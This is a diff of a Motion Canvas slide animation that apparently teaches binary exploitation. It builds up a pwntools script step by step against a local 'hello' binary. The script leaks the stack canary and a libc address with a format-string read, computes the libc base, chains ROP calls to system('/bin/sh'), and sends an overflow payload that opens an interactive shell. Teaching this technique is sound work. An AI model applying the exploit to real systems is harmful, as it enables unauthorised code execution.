@@ -1,5 +1,5 @@
 import {Circle, makeScene2D} from '@motion-canvas/2d';
-import {Direction, all, beginSlide, createRef, slideTransition} from '@motion-canvas/core';
+import {DEFAULT, Direction, all, beginSlide, createRef, slideTransition} from '@motion-canvas/core';
 import { CodeBlock, remove, insert, edit, lines } from '@motion-canvas/2d/lib/components/CodeBlock';
 
 const BACKGROUND = '#282C34';
@@ -62,18 +62,171 @@ io.recvuntil(b"name: ")`)}`,
     yield* beginSlide("write printf");
 
     yield* all(code().edit(.3, false)`
-    from pwn import *
-    # Hello, libc a canary
-    
-    bin = ELF('./hello')
-    libc = ELF('/usr/lib/libc.so.6')
-    
-    context.terminal = "kitty"
-    
-    # io = process('./hello')
-    io = gdb.debug('./hello')
+from pwn import *
+# Hello, libc a canary
 
-    io.recvuntil(b"name: ")${insert(`
-    io.sendline(b"%7$p")`)}`,
+bin = ELF('./hello')
+libc = ELF('/usr/lib/libc.so.6')
+
+context.terminal = "kitty"
+
+# io = process('./hello')
+io = gdb.debug('./hello')
+
+io.recvuntil(b"name: ")${insert(`
+io.sendline(b"%7$lx;%8$lx")`)}`,
     code().selection(lines(12), .3));
+
+    yield* beginSlide("offsets");
+
+    yield* all(code().edit(.3, false)`
+from pwn import *
+# Hello, libc a canary
+
+bin = ELF('./hello')
+libc = ELF('/usr/lib/libc.so.6')
+
+context.terminal = "kitty"
+
+# io = process('./hello')
+io = gdb.debug('./hello')
+
+io.recvuntil(b"name: ")
+io.sendline(b"%7$lx;%8$lx")${insert(`
+io.recvuntil(b"Welcome ")
+leak = io.recvline().strip().split(b';')
+leak = [int(x, 16) for x in leak]`)}`,
+    code().selection(lines(13, 15), .3));
+
+    yield* beginSlide("calculations");
+
+    yield* code().fontSize(50, .2);
+
+    yield* all(code().edit(.3, false)`
+from pwn import *
+# Hello, libc a canary
+
+bin = ELF('./hello')
+libc = ELF('/usr/lib/libc.so.6')
+
+context.terminal = "kitty"
+
+# io = process('./hello')
+io = gdb.debug('./hello')
+
+io.recvuntil(b"name: ")
+io.sendline(b"%7$lx;%8$lx")
+io.recvuntil(b"Welcome ")
+leak = io.recvline().strip().split(b';')
+leak = [int(x, 16) for x in leak]${insert(`
+
+canary = leak[0]
+libc.address = leak[1] - (0x7792fd610cd0 - 0x7792fd5eb000)
+print("libcaddr: " + hex(libc.address))
+print("canary:   " + hex(canary))`)}`,
+    code().selection(lines(16, 20), .3));
+
+    yield* beginSlide("rop");
+
+    yield* all(code().edit(.3, false)`
+from pwn import *
+# Hello, libc a canary
+
+bin = ELF('./hello')
+libc = ELF('/usr/lib/libc.so.6')
+
+context.terminal = "kitty"
+
+# io = process('./hello')
+io = gdb.debug('./hello')
+
+io.recvuntil(b"name: ")
+io.sendline(b"%7$lx;%8$lx")
+io.recvuntil(b"Welcome ")
+leak = io.recvline().strip().split(b';')
+leak = [int(x, 16) for x in leak]
+
+canary = leak[0]
+libc.address = leak[1] - (0x7792fd610cd0 - 0x7792fd5eb000)
+print("libcaddr: " + hex(libc.address))
+print("canary:   " + hex(canary))${insert(`
+
+rop = ROP(libc, badchars=b'\\n')
+rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\\x00"))])
+rop.call(libc.symbols['exit'], [0])`)}`,
+    code().selection(lines(22, 25), .3));
+
+    yield* beginSlide("send");
+
+    yield* all(code().edit(.3, false)`
+from pwn import *
+# Hello, libc a canary
+
+bin = ELF('./hello')
+libc = ELF('/usr/lib/libc.so.6')
+
+context.terminal = "kitty"
+
+# io = process('./hello')
+io = gdb.debug('./hello')
+
+io.recvuntil(b"name: ")
+io.sendline(b"%7$lx;%8$lx")
+io.recvuntil(b"Welcome ")
+leak = io.recvline().strip().split(b';')
+leak = [int(x, 16) for x in leak]
+
+canary = leak[0]
+libc.address = leak[1] - (0x7792fd610cd0 - 0x7792fd5eb000)
+print("libcaddr: " + hex(libc.address))
+print("canary:   " + hex(canary))
+
+rop = ROP(libc, badchars=b'\\n')
+rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\\x00"))])
+rop.call(libc.symbols['exit'], [0])${insert(`
+
+io.recvuntil(b"name: ")
+io.sendline(flat({
+    32: p32(0), 40: p64(canary), 56: libc.sym["system"] + 44, 64: rop.chain()
+}))`)}`,
+    code().selection(lines(26, 29), .3));
+
+    yield* beginSlide("send");
+
+    yield* all(code().edit(.3, false)`
+from pwn import *
+# Hello, libc a canary
+
+bin = ELF('./hello')
+libc = ELF('/usr/lib/libc.so.6')
+
+context.terminal = "kitty"
+
+# io = process('./hello')
+io = gdb.debug('./hello')
+
+io.recvuntil(b"name: ")
+io.sendline(b"%7$lx;%8$lx")
+io.recvuntil(b"Welcome ")
+leak = io.recvline().strip().split(b';')
+leak = [int(x, 16) for x in leak]
+
+canary = leak[0]
+libc.address = leak[1] - (0x7792fd610cd0 - 0x7792fd5eb000)
+print("libcaddr: " + hex(libc.address))
+print("canary:   " + hex(canary))
+
+rop = ROP(libc, badchars=b'\\n')
+rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\\x00"))])
+rop.call(libc.symbols['exit'], [0])
+
+io.recvuntil(b"name: ")
+io.sendline(flat({
+    32: p32(0), 40: p64(canary), 56: libc.sym["system"] + 44, 64: rop.chain()
+}))${insert(`
+
+io.interactive()`)}`,
+    code().selection(DEFAULT, .3));
+
+    yield* beginSlide("done");
 });
